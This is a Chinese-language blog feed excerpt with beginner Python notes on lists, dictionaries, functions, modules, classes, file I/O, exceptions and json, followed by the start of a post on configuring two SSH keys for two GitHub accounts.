<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">a=[[[<span class="number">1</span>,<span class="string">&#x27;HEXO&#x27;</span>],<span class="number">2</span>,<span class="number">3</span>],<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line">b=[<span class="string">&#x27;Xorex&#x27;</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">a.append(b)</span><br><span class="line">print(a[<span class="number">0</span>][<span class="number">0</span>][<span class="number">1</span>])</span><br></pre></td></tr></table></figure>
<p>最后输出的结果就是<code>HEXO</code></p>
<h2 id="元组"><a href="#元组" class="headerlink" title="元组"></a>元组</h2><p>元组就是不能修改的列表，从<code>Python</code>里面有元组就可以看出来，<code>Python</code>真的是一个非常实用化的语言，而并非追求灵活和性能的C++。（实测Python的速度超级慢，同样的计算量大概需要耗时是C++的二十倍到一百倍）</p>
<h2 id="条件语句"><a href="#条件语句" class="headerlink" title="条件语句"></a>条件语句</h2><p><code>Python</code>里面的<code>if</code>语句和<code>C++</code>里面基本上是一样的，不同之处就是在判断多个满足条件的时候，<code>Python</code>使用的是英文<code>and</code>、<code>or</code>等等，而并非符号语言。</p>
<p>其次<code>Python</code>支持判断一个元素是否在一个列表里面，使用<code>in</code>即可，比如：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">a=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line"><span class="keyword">if</span> <span class="number">1</span> <span class="keyword">in</span> a: </span><br><span class="line">    print(<span class="string">&quot;Yes!&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>这样就会判断<code>1</code>在列表<code>a</code>中，所以就返回了<code>true</code>值，输出了<code>Yes!</code>。</p>
<h2 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h2><p>字典是<code>Python</code>完全不同于<code>C++</code>的一种变量类型。可以说是语言自带的<code>Hash</code>，非常强大，非常实用！</p>
<p>首先实用字典之前需要先声明一个空字典<code>a=&#123;&#125;</code></p>
<p>字典数据的添加不需要函数，直接<code>a[&#39;Xorex&#39;]=&quot;The Best Coder!</code>，就添加了<code>Xorex-The Best Coder!</code>的一个键-值对，在访问<code>a[&#39;Xorex&#39;]</code>的时候，返回的值直接就是<code>The Best Coder!</code></p>
<p>需要删除使用<code>del</code>格式即可：<code>del a[&#39;Xorex&#39;]</code>这样这个键值对就被删除了。</p>
<hr>
<p>和列表一样，字典也可以实现多维度操作，原理就是俄罗斯套娃，字典里面随便套，一层套一层，下标和<code>C++</code>一样，比如下面的代码：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">a=&#123;<span class="number">1</span>:<span class="number">1</span>,<span class="number">2</span>:&#123;<span class="number">1</span>:&#123;<span class="number">1</span>:<span class="number">1</span>,<span class="number">2</span>:<span class="number">2</span>&#125;,<span class="number">2</span>:<span class="number">2</span>&#125;&#125;</span><br><span class="line">b=[<span class="string">&#x27;Xorex&#x27;</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">a[<span class="number">2</span>][<span class="number">1</span>][<span class="number">2</span>]=b</span><br><span class="line">print(a[<span class="number">2</span>][<span class="number">1</span>][<span class="number">2</span>][<span class="number">0</span>])</span><br></pre></td></tr></table></figure>
<p>输出结果就是<code>Xorex</code></p>
<hr>
<p>字典和列表一样，也可以使用<code>for</code>循环来把所有元素遍历一遍，比如下面的代码：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">a=&#123;<span class="number">1</span>:<span class="number">1</span>,<span class="number">2</span>:&#123;<span class="number">1</span>:&#123;<span class="number">1</span>:<span class="number">1</span>,<span class="number">2</span>:<span class="number">2</span>&#125;,<span class="number">2</span>:<span class="number">2</span>&#125;&#125;</span><br><span class="line">b=[<span class="string">&#x27;Xorex&#x27;</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">a[<span class="number">2</span>][<span class="number">1</span>][<span class="number">2</span>]=b</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a[<span class="number">2</span>]:</span><br><span class="line">    print(i,a[<span class="number">2</span>][i])</span><br></pre></td></tr></table></figure>
<p>输出结果就是：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> &#123;<span class="number">1</span>: <span class="number">1</span>, <span class="number">2</span>: [<span class="string">&#x27;Xorex&#x27;</span>, <span class="number">2</span>, <span class="number">3</span>]&#125;</span><br><span class="line"><span class="number">2</span> <span class="number">2</span></span><br></pre></td></tr></table></figure>
<h2 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h2><p><code>Python</code>默认让用户输入的都是以字符串的形式存储在变量里面，如果需要不同的数据类型，那么就需要强制转换，写法和<code>C++</code>一样：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">a=<span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">a=a+<span class="number">1</span></span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure>
<p>输出的结果就是你所输入的值加一。</p>
<hr>
<p><code>split()</code>可以实现像cin一样的读入一行的不同数据，原理就是将一行字符串以空格分开，单独存储在一个列表里面。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">a,b=<span class="built_in">input</span>().split()</span><br></pre></td></tr></table></figure>
<p>等价于</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cin</span>&gt;&gt;a&gt;&gt;b;</span><br></pre></td></tr></table></figure>
<p>上面使用<code>split()</code>的时候，一定要保证一行里面只有两个数据，不然就会出现<code>ValueError</code>，如果不放心的话可以使用<code>try-except</code>代码块或者直接将一行分离的数据存储在列表中。</p>
<p>split「分裂，分离」</p>
<p><a href="https://www.runoob.com/python/att-string-split.html">具体用法</a></p>
<h2 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h2><p><code>Python</code>和<code>C++</code>一样，有两种循环方式，一种是<code>for</code>另一种是<code>while</code>。</p>
<p>详情：<a href="https://www.runoob.com/python3/python3-loop.html">循环语句</a></p>
<p>但是这里需要注意的是，如果在使用<code>for</code>循环来遍历整个列表的时候，就不应该修改这个列表，否则就会出现一些奇奇怪怪的错误，这个时候就应该使用<code>while</code>循环。</p>
<hr>
<p>同时<code>Python</code>也带有<code>continue</code>和<code>break</code>语句，使用方法和<code>C++</code>一模一样。</p>
<p><strong>注意</strong><code>Python</code>里面的<code>True</code>和<code>False</code>首字母是大写的！</p>
<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p>格式：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">name</span>(<span class="params">variable=<span class="number">0</span></span>):</span></span><br><span class="line">    then work</span><br><span class="line">    <span class="keyword">return</span> something</span><br></pre></td></tr></table></figure>
<p>其实<code>Python</code>函数的各种功能个<code>C++</code>的差不多，但是需要注意的是，当你在函数里面修改传递的参数的时候，如果参数是数字，字符串的话，是不会影响函数实参的值的。但是如果你传递进去的参数是列表和字典，那么当你修改形参的值的时候，实参的值也会变，这点是必须要注意的，比如下面代码：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">a=[<span class="number">1</span>,<span class="number">2</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Change</span>(<span class="params">b</span>):</span></span><br><span class="line">    b.append(<span class="number">3</span>)</span><br><span class="line">Change(a)</span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure>
<p>最后输出的列表<code>a</code>的值是<code>[1,2,3]</code>，即使你修改的是<code>b</code>的值，那么实参也会跟着改变，如果想要实参不会跟着改变，那就需要这样写：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">a=[<span class="number">1</span>,<span class="number">2</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Change</span>(<span class="params">b</span>):</span></span><br><span class="line">    b.append(<span class="number">3</span>)</span><br><span class="line">Change(a[:])</span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure>
<p>传进去一个被复制下来的列表，这样修改函数里面的列表的时候就不会连带着一起修改实参的数据了。然后上述代码的输出结果就是<code>[1,2]</code>，可见实参<code>a</code>列表并没有被跟着一起修改。</p>
<h2 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h2><blockquote>
<p><code>Python</code>的模块，其实和<code>C++</code>里面的库差不多，就是一个各种函数的集合体，不过不需要你在主代码里面编写函数，这些函数存储在其他文件里面，你直接通过调用其函数所在的模块，就可以间接调用这个函数。</p>
</blockquote>
<p>模块是一个独立的文件，拓展名是<code>.py</code>，里面直接留各种函数就行了，比如我们开一个模块叫做<code>Xorex.py</code>，里面包含三个函数。</p>
<p>文件<code>Xorex.py</code></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">The_True</span>():</span></span><br><span class="line">    print(<span class="string">&quot;Xorex is the best!&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">The_False</span>():</span></span><br><span class="line">    print(<span class="string">&quot;Xorex is not the best!&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Xorex</span>():</span></span><br><span class="line">    print(<span class="string">&quot;Xorex is a programmer!&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>然后我们就可以在其他代码里面调用这个函数。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Xorex <span class="comment">#使用import来导入整个模块Xorex</span></span><br><span class="line">Xorex.The_True() </span><br><span class="line">Xorex.Xorex()</span><br><span class="line">Xorex.The_False()</span><br><span class="line"><span class="comment">#调用模块Xorex里面的三个函数</span></span><br></pre></td></tr></table></figure>
<p>结果就是输出了:</p>
<p>「世界真理」：<code>Xorex is the best!</code></p>
<p>「真实身份」：<code>Xorex is a programmer!</code></p>
<p>「世界谎言」：<code>Xorex is not the best!</code></p>
<p>import 「引进，进口」</p>
<p>而<code>import</code>导入的是整个模块里面的所有东西，整个模块会全部添加到自己的程序里面，如果不想全部都导入，而是导入特定的函数，那么就需要这样写：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Xorex <span class="keyword">import</span> Xorex,The_True</span><br><span class="line">Xorex()</span><br><span class="line">The_True()</span><br><span class="line">The_False()</span><br></pre></td></tr></table></figure>
<p>或者不导入整个模块，导入全部的函数，并且函数的调用和上面是一样，</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Xorex <span class="keyword">import</span> *</span><br><span class="line">Xorex()</span><br><span class="line">The_True()</span><br><span class="line">The_False()</span><br></pre></td></tr></table></figure>
<p>这两种导入方式在调用函数的时候不需要写模块的名字，只需要像直接调用本地函数一样调用就好了。而且<code>Python</code>还支持重新命名，如下把<code>Xorex</code>模块里面的<code>The_True()</code>重新命名为<code>TT()</code>：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Xorex <span class="keyword">import</span> The_True <span class="keyword">as</span> TT</span><br><span class="line">TT()</span><br></pre></td></tr></table></figure>
<hr>
<p>模块支持将一个模块里面的函数导入到另外一个模块里面，只要在模块前面写上<code>import</code>语句就行了，实际操作可以参考下面<code>class</code>从一个模块导入另一个模块的操作。</p>
<h2 id="class类"><a href="#class类" class="headerlink" title="class类"></a>class类</h2><p>类就是<code>C++</code>里面加强版的结构体，或者说结构体是特殊的类，下面是类创建的格式：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,First,Last</span>):</span></span><br><span class="line">        self.First_Name=First</span><br><span class="line">        self.Last_Name=Last</span><br><span class="line">Xorex=Name(<span class="string">&#x27;Tempest&#x27;</span>,<span class="string">&#x27;Xorex&#x27;</span>)</span><br><span class="line">print(Xorex.First_Name,Xorex.Last_Name)</span><br></pre></td></tr></table></figure>
<p>这样就实现了类似于<code>C++</code>里面结构体的功能了，定义“结构体”名字为<code>Name</code>，<code>Name</code>里面有两个子元素，分别为<code>First_Name</code>和<code>Last_Name</code>。需要“声明”一个“结构体”类型的变量的时候，只需要另此变量等于所定义的结构体就行了，需要为变量赋值的话可以以函数的形式传递参数，其中<code>self</code>参数不需要传递，<code>Python</code>会自动向<code>self</code>传递目前对象（Xorex）的地址，也就是说，调用<code>Xorex=Name(&#39;Tempest&#39;,&#39;Xorex&#39;)</code>的时候，<code>self</code>在里面就相当于<code>Xorex</code>，也就是说，<code>self.First_Name=First</code>就会等价于<code>Xorex.First_Name=First</code>，因为<code>self</code>被传入了<code>Xorex</code>的地址。</p>
<p>而<code>__init__</code>函数（方法）是<code>class</code>里面自动运行的名字，如果在定义<code>class</code>的时候，添加有一个叫做<code>__init__</code>的函数（方法），那么在声明<code>class</code>类型变量的时候会自动运行这个叫做<code>__init__</code>的函数（方法）。你可以用<code>__init__</code>函数（方法）在声明<code>class</code>类型变量的时候，直接就赋值，因为<code>class</code>里面的变量是不允许没有初始值的。</p>
<p>当然如果你想声明以后再给<code>class</code>里面的变量赋值的话，可以这样写：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span>:</span></span><br><span class="line">    First_Name=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    Last_Name=<span class="string">&#x27;&#x27;</span></span><br><span class="line">Xorex=Name()</span><br><span class="line">Xorex.First_Name=<span class="string">&#x27;Tempest&#x27;</span></span><br><span class="line">Xorex.Last_Name=<span class="string">&#x27;Xorex&#x27;</span></span><br><span class="line">print(Xorex.First_Name,Xorex.Last_Name)</span><br></pre></td></tr></table></figure>
<p>输出的结果和上面的代码是一样的。</p>
<hr>
<p><code>class</code>比<code>C++</code>里面结构体厉害的地方在于，<code>class</code>功能更多，比如里面可以内置函数（方法），但是这个标准名称叫方法，下文也不再以函数称呼，而是方法。</p>
<p>同样和上面定义的方法<code>__init__()</code>一样，所有的<code>class</code>内部定义的方法都需要一个参数，用来记录当前对象的地址，程序员们约定俗成使用<code>self</code>作为此参数，位于所有形参的前面，即使方法不需要传递参数，那么还是需要<code>self</code>来记录地址的。</p>
<p>比如我们可以实现一个<code>class</code>内部的方法：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">bilibili</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Cheer</span>(<span class="params">self,Name</span>):</span></span><br><span class="line">        print(Name+<span class="string">&quot;,Let&#x27;s cheer for bilibili!&quot;</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Coin</span>(<span class="params">self,Number</span>):</span></span><br><span class="line">        <span class="keyword">if</span> Number == <span class="number">1</span>:</span><br><span class="line">            print(<span class="string">&quot;You have successfully thrown a coin!&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> Number == <span class="number">2</span>:</span><br><span class="line">            print(<span class="string">&quot;You have successfully thrown two coins!&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&quot;Sorry,You can&#x27;t throw this coins!&quot;</span>)</span><br><span class="line">Xorex=bilibili()</span><br><span class="line">Xorex.Cheer(<span class="string">&quot;Xorex&quot;</span>)</span><br><span class="line">Xorex.Coin(-<span class="number">1</span>)</span><br><span class="line">Xorex.Coin(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
<p>这里首先声明一个自定义<code>bilibili</code>类型的变量<code>Xorex</code>，然后调用<code>bilibili</code>里面的方法。格式：<code>Variable.Function(Parameter/None)</code></p>
<hr>
<p><code>class</code>是可以继承的，「继承」字面意思，即使用其他<code>class</code>的功能（比如其他<code>class</code>定义的方法）</p>
<p>下面就是一个<code>class</code>继承上面三个<code>class</code>的各种功能的代码：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">First</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        print(<span class="string">&quot;First&quot;</span>)</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Second</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        print(<span class="string">&quot;Second&quot;</span>)</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Third</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        print(<span class="string">&quot;Third&quot;</span>)</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Son</span>(<span class="params">First,Second,Third</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        First.__init__(self)</span><br><span class="line">        Second.__init__(self)</span><br><span class="line">        Third.__init__(self)</span><br><span class="line">Xorex=Son()</span><br></pre></td></tr></table></figure>
<p><code>Son</code>继承了上面的<code>First</code>、<code>Second</code>和<code>Third</code>的功能，然后被<code>Son</code>的默认执行方法执行了使用前面三个<code>class</code>的默认执行方法的命令。最后的输出结果:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">First</span><br><span class="line">Second</span><br><span class="line">Third</span><br></pre></td></tr></table></figure>
<hr>
<p><code>class</code>和函数一样，支持存储在模块中，从外部进行调用，两者格式是一样的，都是通过<code>import</code>来实现。</p>
<p>新建一个叫<code>Xorex.py</code>的模块，里面存入需要的<code>class</code>:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">First</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        print(<span class="string">&quot;First&quot;</span>)</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Second</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        print(<span class="string">&quot;Second&quot;</span>)</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Third</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        print(<span class="string">&quot;Third&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>然后在当前代码调用<code>Xorex</code>模块里面定义的<code>class</code>：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#导入整个模块，需要调用前指明Xorex模块</span></span><br><span class="line"><span class="keyword">import</span> Xorex</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Son</span>(<span class="params">Xorex.First,Xorex.Second,Xorex.Third</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        Xorex.First.__init__(self)</span><br><span class="line">        Xorex.Third.__init__(self)</span><br><span class="line">Xorex=Son()</span><br></pre></td></tr></table></figure>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#只导入需要的class，或者全部class，不需要指明Xorex模块</span></span><br><span class="line"><span class="keyword">from</span> Xorex <span class="keyword">import</span> First,Second,Third <span class="comment">#指名导入class</span></span><br><span class="line"><span class="keyword">from</span> Xorex <span class="keyword">import</span> * <span class="comment">#导入全部class</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Son</span>(<span class="params">First,Second,Third</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        First.__init__(self)</span><br><span class="line">        Third.__init__(self)</span><br><span class="line">Xorex=Son()</span><br></pre></td></tr></table></figure>
<hr>
<p><code>class</code>支持不同模块之间的相互导入，如果将导入看做是代码复制的话其实就很好理解了，使用在模块前面加上<code>import</code>语句就行了。注意的是<code>import Name</code>格式导入的是整个模块所有的内容，所以在模块的相互导入的时候不能使用：<code>import Name</code>格式，而应该使用<code>from XXX import XXX</code>导入类。在主程序里面调用模块的时候不受限制，可以使用上面的两种导入方法。</p>
<h2 id="文件处理"><a href="#文件处理" class="headerlink" title="文件处理"></a>文件处理</h2><p>读取文件里面的数据格式，这里使用<code>with open(&#39;XXX&#39;) as XXX</code>的写法，可以不用管文件关闭的问题，<code>Python</code>会执行完<code>with</code>句型后面的代码之后关掉文件。而这里<code>open()</code>里面填写的是文件名称，后面的<code>XXX</code>是一个变量，用来存储你打开文件的地址。文件一旦关闭，存储的文件地址也就无法使用了。</p>
<p>那么如何获得文件里面的数据呢，需要使用<code>read()</code>来以字符串的形式返回文件里面的所有内容。如果需要分开处理，直接上<code>split()</code>大法。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">Data=[]</span><br><span class="line">Path=<span class="string">&#x27;D:\Xorex\python\data.in&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(Path) <span class="keyword">as</span> Xorex:</span><br><span class="line">    Data=Xorex.read().split()</span><br><span class="line">n=<span class="built_in">int</span>(Data[<span class="number">0</span>])</span><br><span class="line">m=<span class="built_in">int</span>(Data[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">del</span> Data[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">del</span> Data[<span class="number">0</span>]</span><br><span class="line">print(n,m,Data)</span><br></pre></td></tr></table></figure>
<p>这样我们就得到了文件<code>data.in</code>里面所有的数据了，如果文件<code>data.in</code>和<code>Python</code>程序在同一个目录里面，那么就可以简写了，比如，可以删除<code>Python</code>程序目录的地址内容，如果<code>data.in</code>在<code>Python</code>程序同目录的<code>Data</code>文件夹里面，那么<code>Path</code>路径可以更改为：<code>Path=&#39;data\data.in&#39;</code>。</p>
<p>当然我们可以不使用<code>read()</code>来读取整个文件里面的内容，我们可以一行一行的读取，需要用到<code>for</code>循环：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">Data=[]</span><br><span class="line">Path=<span class="string">&#x27;data.in&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(Path) <span class="keyword">as</span> Xorex:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> Xorex:</span><br><span class="line">        print(line.rstrip())</span><br></pre></td></tr></table></figure>
<p>这样每一行的数据都会以字符串的形式被存储在<code>line</code>这个变量里面，使用<code>rstrip()</code>函数是为了删除不必要的空行。</p>
<hr>
<p>使用<code>readlines()</code>函数可以把每一行数据单独的存储在一个列表里面，比如：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;data.in&#x27;</span>) <span class="keyword">as</span> Xorex:</span><br><span class="line">    Data=Xorex.readlines()</span><br><span class="line">print(Data)</span><br></pre></td></tr></table></figure>
<p>这样输出的就是一个列表了。</p>
<hr>
<p><strong>关于文件输出</strong></p>
<p>格式和输入基本一样，不过需要增加一个参数<code>&#39;w&#39;</code>，表明是输出，如果不写<code>&#39;w&#39;</code>默认是文件输入。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;data.out&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> Xorex:</span><br><span class="line">    Xorex.write(<span class="string">&quot;Xorex is the best coder!&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>运行程序会生成一个名称为<code>data.out</code>的文件，里面就包含这一句话：<code>Xorex is the best coder!</code></p>
<p>使用<code>&#39;w&#39;</code>来输出数据会使被输出的文件清空，如果你不想原来<code>data.out</code>的数据被清空（覆盖），那么你就可以使用参数<code>&#39;a&#39;</code>，是<code>add</code>的意思，不改变文件里面的内容，直接在后面加上要输出的东西。</p>
<p>注意这里<code>write</code>只能输出字符串，如果想要以其他形式输出，那么可以使用<code>json</code>模块规范化输出。</p>
<hr>
<p>这里再介绍一种文件输出更好的写法：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">Xorex=<span class="built_in">open</span>(<span class="string">&#x27;data.out&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">Xorex.write(<span class="string">&quot;Xorex is the best coder!&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>注意这里<code>Xorex</code>是特定的指向<code>data.out</code>这个输出文件可以再程序里任何位置调用<code>Xorex.write()</code>函数，并且<code>open</code>里面还有很多参数，比如<a href="https://www.runoob.com/python3/python3-func-open.html">Python3 open()函数</a></p>
<h2 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h2><p>当<code>Python</code>程序遇到运行错误的时候，我们当然并不想让这个程序就这样不知所措的停止运行，所以<code>try-except</code>语句便诞生了，可以定向处理错误，知道有这个东西就行了，估计很少用到（目前）</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">a,b=<span class="built_in">input</span>().split()</span><br><span class="line">a=<span class="built_in">int</span>(a)</span><br><span class="line">b=<span class="built_in">int</span>(b)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    print(a/b)</span><br><span class="line"><span class="keyword">except</span> ZeroDivisionError:</span><br><span class="line">    print(<span class="string">&quot;You can&#x27;t divide by zero!&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>上面代码里面，程序会先尝试运行<code>try</code>后面的，如果出现了<code>except</code>后面跟随的异常<code>ZeroDivisionError</code>，也就是除零错误，那么就会执行<code>except</code>下面的代码，也就是输出错误原因。如果想要出现错误的时候程序什么都不做，那么在<code>except</code>下面写上<code>pass</code>即可。</p>
<h2 id="存储数据"><a href="#存储数据" class="headerlink" title="存储数据"></a>存储数据</h2><p>模块<code>json</code>可以将程序里面的数据单独存储下来，即使程序结束运行数据仍然存在。<code>json</code>是可以跨平台使用的，所以子啊使用<code>json</code>模块的时候，一定要记得使用<code>import</code>将其导入到代码里面。</p>
<p><code>json.dump(data,file_object)</code>函数需要接受两个参数，一个是需要存储的数据<code>data</code>，另外一个就是需要存储的目标文件的地址<code>file_object</code>，一般这个地址在使用<code>with open(file) as file_object</code>的时候，已经吧<code>file</code>的地址存储在了<code>file_object</code>里面。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line">Numbers=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;data.out&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> Xorex:</span><br><span class="line">    json.dump(Numbers,Xorex)</span><br></pre></td></tr></table></figure>
<p>这样<code>Numbers</code>里面的数据就会以列表的形式存储在<code>data.out</code>文件里面了。打开<code>data.out</code>文件，你就会发现里面有：<code>[1,2,3,4,5,6]</code>。</p>
<p><code>dump</code>:「丢弃，倾倒」</p>
<hr>
<p>我们如果需要从规范的<code>json</code>格式的数据文件里面读入数据，就不能使用<code>read()</code>了，因为这样读进去的是字符串而并非列表，字典等格式化数据。这里就需要使用<code>json</code>里面的<code>load</code>函数。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;data.in&#x27;</span>) <span class="keyword">as</span> Xorex:</span><br><span class="line">    Numbers=json.load(Xorex)</span><br></pre></td></tr></table></figure>
<p>这样变量<code>Numbers</code>里面就存储了来自于<code>data.in</code>文件里面的标准数据了。如果<code>data.in</code>里面没有存储数据就去读取，那么就会报错，为了避免这样的情况，我们可以使用<code>try-except</code>语句来判断是否出现异常，并写出应对异常的代码。</p>
<h1 id="最后总结："><a href="#最后总结：" class="headerlink" title="最后总结："></a>最后总结：</h1><blockquote>
<p>至此，<code>Python</code>的基础学习暂时告一段落，开始<code>Python</code>实战内容，加油吧！</p>
</blockquote>
<p><img src="https://xorex.space/image/101.jpg"></p>
]]></content>
      <categories>
        <category>开发知识</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>一台电脑上两个 SSH 的配置方法</title>
    <url>/2018/04/25/d633663416bc/</url>
    <content><![CDATA[<h1 id="关于两个SSH的需求"><a href="#关于两个SSH的需求" class="headerlink" title="关于两个SSH的需求"></a>关于两个SSH的需求</h1><blockquote>
<p>这几天想要再用 GitHub 造一个网站，但是再配置 SSH 的时候出现了问题。发现一台电脑上使用两个公钥和秘钥在上传到 GitHub 上面的时候会出问题……所以就去百度了各种的解决方案，最后成功的搞定了，特意来写一篇博客。</p>
</blockquote>
<h1 id="具体操作过程"><a href="#具体操作过程" class="headerlink" title="具体操作过程"></a>具体操作过程</h1><ul>
<li><p>首先就是你需要拥有两个公钥和秘钥，如果你原本电脑里就有公钥和秘钥了，那么你就去~/.ssh目录下把公钥和秘钥修改一下名字，加一个one的后缀什么的，这样再次生成公钥和秘钥的时候就不会文件名冲突，修改完文件名之后，在 ~/ 目录下打开Git，然后输入指令：<code>ssh-keygen -t rsa –C “youremail@example.com&quot;</code> 直接一路回车就行。</p>
</li>
<li><p>你就会发现又多了两个文件，同样修改文件名，这样你就有两份公钥和秘钥了。如下图：</p>
</li>
</ul>
<p><img src="https://xorex.space/image/093.PNG"></p>
<p>然后你就把这两个公钥分别上传到 GitHub 的 SSH keys里面，这样两个公钥分别管理两个不同的 GitHub 账号。</p>
